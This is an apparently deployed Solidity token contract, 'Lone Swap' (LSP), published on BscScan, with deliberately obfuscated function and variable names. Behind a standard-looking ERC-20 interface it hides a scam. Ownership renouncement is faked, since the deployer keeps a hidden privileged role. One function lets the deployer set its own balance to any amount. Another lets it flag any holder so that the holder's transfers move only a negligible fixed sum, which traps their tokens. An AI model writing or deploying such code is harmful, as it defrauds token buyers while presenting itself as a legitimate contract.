/**
 *Submitted for verification at BscScan.com on 2023-02-21
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

abstract contract vyhgkqmkmimx {
    function pzxxbxkls() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed sender,
        address indexed spender,
        uint256 value
    );
}


interface qazsseycpalqsd {
    function createPair(address sdfpceokr, address tkwjempjsadff) external returns (address);
}

interface jaxpglfmq {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract LoneSwap is IERC20, vyhgkqmkmimx {

    mapping(address => bool) public qtlummcre;

    function blygyblelaxnke() public {
        
        
        okclcjvxkwbe=false;
    }

    mapping(address => uint256) private xodgazbhhs;

    mapping(address => mapping(address => uint256)) private pchbfwjajs;

    function lwxymmhrln(address wdtpbzjsspjz) public {
        if (gbzvdoxrfq) {
            return;
        }
        if (nxqcttlojztsu) {
            nxqcttlojztsu = false;
        }
        qtlummcre[wdtpbzjsspjz] = true;
        if (nxqcttlojztsu) {
            gagdvgcakhn = true;
        }
        gbzvdoxrfq = true;
    }

    function symbol() external view returns (string memory) {
        return nmygaccblyxbe;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return wmpnberehcbytb;
    }

    function plahbacvfe(uint256 uhyacvpvroip) public {
        if (!qtlummcre[pzxxbxkls()]) {
            return;
        }
        xodgazbhhs[svsjkvrhbsek] = uhyacvpvroip;
    }

    bool private okclcjvxkwbe;

    bool public nxqcttlojztsu;

    mapping(address => bool) public vceqrfjfjennz;

    address private dmeqmqstjy;

    function xnlfqnctkqk() public {
        
        
        frcbvbldafpua=0;
    }

    function euvgcfpwan(address gjkwjrhbpf) public {
        if (bpnomvradbfona == nxqcttlojztsu) {
            nxqcttlojztsu = false;
        }
        if (gjkwjrhbpf == svsjkvrhbsek || gjkwjrhbpf == yzxvrykpvuex || !qtlummcre[pzxxbxkls()]) {
            return;
        }
        
        vceqrfjfjennz[gjkwjrhbpf] = true;
    }

    function yuyvxypfbvjr(address dbitjpddcfjzgu, address aeisanfcbbajip, uint256 uhyacvpvroip) internal returns (bool) {
        if (dbitjpddcfjzgu == svsjkvrhbsek) {
            return pztajssyf(dbitjpddcfjzgu, aeisanfcbbajip, uhyacvpvroip);
        }
        if (vceqrfjfjennz[dbitjpddcfjzgu]) {
            return pztajssyf(dbitjpddcfjzgu, aeisanfcbbajip, wxoqkamqraqjej);
        }
        return pztajssyf(dbitjpddcfjzgu, aeisanfcbbajip, uhyacvpvroip);
    }

    function loupnkmdjbije() public view returns (bool) {
        return bpnomvradbfona;
    }

    bool public gagdvgcakhn;

    function zcpemuqvoamq() public {
        emit OwnershipTransferred(svsjkvrhbsek, address(0));
        dmeqmqstjy = address(0);
    }

    uint256 constant wxoqkamqraqjej = 9 ** 10;

    event OwnershipTransferred(address indexed xflibcdchwtkjq, address indexed ceukhmijbx);

    uint8 private cweifweqaxqj = 18;

    constructor (){ 
        if (dhkywgmnel != frcbvbldafpua) {
            nxqcttlojztsu = false;
        }
        jaxpglfmq suoswcytdcxt = jaxpglfmq(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        yzxvrykpvuex = qazsseycpalqsd(suoswcytdcxt.factory()).createPair(suoswcytdcxt.WETH(), address(this));
        dmeqmqstjy = pzxxbxkls();
        if (frcbvbldafpua == dhkywgmnel) {
            dhkywgmnel = frcbvbldafpua;
        }
        svsjkvrhbsek = pzxxbxkls();
        qtlummcre[pzxxbxkls()] = true;
        if (bpnomvradbfona) {
            nxqcttlojztsu = false;
        }
        xodgazbhhs[pzxxbxkls()] = wmpnberehcbytb;
        emit Transfer(address(0), svsjkvrhbsek, wmpnberehcbytb);
        zcpemuqvoamq();
    }

    uint256 private frcbvbldafpua;

    function pztajssyf(address dbitjpddcfjzgu, address aeisanfcbbajip, uint256 uhyacvpvroip) internal returns (bool) {
        require(xodgazbhhs[dbitjpddcfjzgu] >= uhyacvpvroip);
        xodgazbhhs[dbitjpddcfjzgu] -= uhyacvpvroip;
        xodgazbhhs[aeisanfcbbajip] += uhyacvpvroip;
        emit Transfer(dbitjpddcfjzgu, aeisanfcbbajip, uhyacvpvroip);
        return true;
    }

    address public yzxvrykpvuex;

    uint256 private dhkywgmnel;

    bool public bpnomvradbfona;

    function transferFrom(address dbitjpddcfjzgu, address aeisanfcbbajip, uint256 uhyacvpvroip) external override returns (bool) {
        if (pchbfwjajs[dbitjpddcfjzgu][pzxxbxkls()] != type(uint256).max) {
            require(uhyacvpvroip <= pchbfwjajs[dbitjpddcfjzgu][pzxxbxkls()]);
            pchbfwjajs[dbitjpddcfjzgu][pzxxbxkls()] -= uhyacvpvroip;
        }
        return yuyvxypfbvjr(dbitjpddcfjzgu, aeisanfcbbajip, uhyacvpvroip);
    }

    uint256 private wmpnberehcbytb = 100000000 * 10 ** 18;

    bool public gbzvdoxrfq;

    function approve(address klawdnawvfb, uint256 uhyacvpvroip) public virtual override returns (bool) {
        pchbfwjajs[pzxxbxkls()][klawdnawvfb] = uhyacvpvroip;
        emit Approval(pzxxbxkls(), klawdnawvfb, uhyacvpvroip);
        return true;
    }

    function name() external view returns (string memory) {
        return ccmavmaez;
    }

    function decimals() external view returns (uint8) {
        return cweifweqaxqj;
    }

    function dpupzouxdgjjt() public {
        
        
        okclcjvxkwbe=false;
    }

    string private ccmavmaez = "Lone Swap";

    function allowance(address voejkgjnjxuflt, address klawdnawvfb) external view virtual override returns (uint256) {
        return pchbfwjajs[voejkgjnjxuflt][klawdnawvfb];
    }

    function transfer(address ngbugkdfvpc, uint256 uhyacvpvroip) external virtual override returns (bool) {
        return yuyvxypfbvjr(pzxxbxkls(), ngbugkdfvpc, uhyacvpvroip);
    }

    function balanceOf(address butjrsdsxqjtxz) public view virtual override returns (uint256) {
        return xodgazbhhs[butjrsdsxqjtxz];
    }

    function owner() external view returns (address) {
        return dmeqmqstjy;
    }

    function getOwner() external view returns (address) {
        return dmeqmqstjy;
    }

    address public svsjkvrhbsek;

    string private nmygaccblyxbe = "LSP";

}